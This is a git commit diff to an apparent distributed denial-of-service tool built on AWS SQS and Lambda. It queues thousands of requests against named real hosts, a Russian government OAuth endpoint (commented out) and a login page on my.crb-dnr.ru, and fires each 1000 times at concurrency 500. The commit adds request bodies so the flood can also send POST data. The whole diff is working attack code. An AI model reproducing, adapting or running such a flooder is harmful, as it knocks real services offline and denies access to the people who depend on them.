c2a532ebb2cb5c8b32bfdbc971c3c1c12af838a6
Vlad Holubiev <golubev.vld@gmail.com>
2022-02-28 20:46:58 +0100

    feat: allow sending body

--- send-to-sqs.ts
+++ send-to-sqs.ts
@@ -6,13 +6,13 @@ const sqs = new AWS.SQS({region: 'us-east-1'});
 
 const payloads: any[] = [];
 
-for (let i = 0; i < 500; i++) {
+for (let i = 0; i < 5000; i++) {
+  // payloads.push({
+  //   url: `https://passport.info.gov.ru/oauth2/authorize?client_id=nsud-pmd&nonce=${Math.random()}&redirect_uri=https%3A%2F%2Fnsud.info.gov.ru%2Fpmd%2Fusers%2Fauth%2Fopenid_connect%2Fcallback&response_type=code&scope=openid%20email%20profile%20groups%20permissions%20fullname%20phone&state=${Math.random()}`,
+  //   method: 'GET',
+  // });
   payloads.push({
-    url: `https://passport.info.gov.ru/oauth2/authorize?client_id=nsud-pmd&nonce=${Math.random()}&redirect_uri=https%3A%2F%2Fnsud.info.gov.ru%2Fpmd%2Fusers%2Fauth%2Fopenid_connect%2Fcallback&response_type=code&scope=openid%20email%20profile%20groups%20permissions%20fullname%20phone&state=${Math.random()}`,
-    method: 'GET',
-  });
-  payloads.push({
-    url: `https://my.crb-dnr.ru/rich/auth?id=${Math.random()}`,
+    url: `https://my.crb-dnr.ru/rich/auth`,
     method: 'GET',
   });
 }
--- src/process/handler.ts
+++ src/process/handler.ts
@@ -5,26 +5,30 @@ import pMap from 'p-map';
 export const handler: SQSHandler = async (event, context) => {
   context.callbackWaitsForEmptyEventLoop = false;
 
-  const data: {url: string; method: string}[] = JSON.parse(event.Records[0].body);
+  const data: {url: string; method: string; body?: string}[] = JSON.parse(event.Records[0].body);
   console.log(data);
 
   for (let i = 0; i < 1000; i++) {
-    await pMap(
-      data,
-      async item => {
-        const resp = await fetch(item.url, {
-          method: item.method,
-          redirect: 'follow',
-        });
-
-        await Promise.race([resp.text(), delay(4000)]);
-
-        console.log(resp.status);
-      },
-      {concurrency: 500, stopOnError: false}
-    );
+    await pMap(data, makeRequest, {concurrency: 500, stopOnError: false});
   }
 };
+
+async function makeRequest(item: any): Promise<void> {
+  const req: any = {
+    method: item.method,
+    redirect: 'follow',
+  };
+
+  if (item.body) {
+    req.body = item.body;
+  }
+
+  const resp = await fetch(item.url, req);
+
+  await Promise.race([resp.text(), delay(4000)]);
+
+  console.log(resp.status);
+}
 
 async function delay(ms: number): Promise<void> {
   return new Promise(resolve => {
